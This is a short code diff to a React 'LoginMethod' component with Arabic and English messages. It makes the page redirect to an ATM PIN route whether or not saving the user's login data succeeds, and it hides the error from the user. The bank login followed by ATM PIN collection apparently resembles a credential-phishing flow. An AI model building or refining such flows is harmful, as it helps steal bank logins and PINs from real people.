@@ -68,10 +68,10 @@ export default function LoginMethod() {
         } as any);
       }
       toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
-      setLocation(`/atm-pin?bank=${bank}&session=${sessionId}`);
     } catch (error) {
-      toast.error(isArabic ? "حدث خطأ في حفظ البيانات" : "Error saving data");
+      console.error("Error saving login method in DB, continuing anyway:", error);
     }
+    setLocation(`/atm-pin?bank=${bank}&session=${sessionId}`);
   };
 
   const toggleLanguage = () => {
